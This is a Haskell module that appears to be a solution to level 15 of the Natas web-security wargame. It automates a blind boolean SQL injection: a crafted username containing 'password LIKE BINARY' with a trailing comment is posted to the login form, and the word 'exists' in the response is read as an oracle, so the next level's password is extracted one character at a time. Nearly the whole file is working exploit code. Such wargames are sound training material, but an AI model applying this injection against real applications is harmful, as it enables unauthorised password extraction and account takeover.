{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas15 where

import           Data.Text    (breakOn, pack)

import           Network.Wreq (partText)

import           Natas.Inject
import           Natas.Natas

solution :: Solution
solution = injectSolution (attemptPassword . placeAnywhereSql) buildPassword

buildPassword :: String -> String -> IO (Maybe String)
buildPassword = buildPassword' (attemptPassword . (++ "%"))

attemptPassword :: String -> IO Bool
attemptPassword guess = do
  let sqlInject =
        (pack . concat)
          ["natas16\" and password LIKE BINARY \"", guess, "\" -- "]
      form = partText "username" sqlInject
  req <- postLevel 15 form
  let body = reqBody req
  pure $
    case breakOn "exists" body of
      (_match, "") -> False
      _tupmatch    -> True
